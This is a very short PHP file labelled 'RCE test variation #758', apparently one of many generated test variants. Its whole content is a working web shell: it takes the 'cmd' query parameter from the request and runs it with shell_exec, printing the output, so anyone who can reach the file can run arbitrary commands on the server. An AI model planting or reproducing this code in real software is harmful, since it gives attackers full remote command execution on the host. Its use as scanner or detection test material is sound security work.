<?php
// RCE test variation #758
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>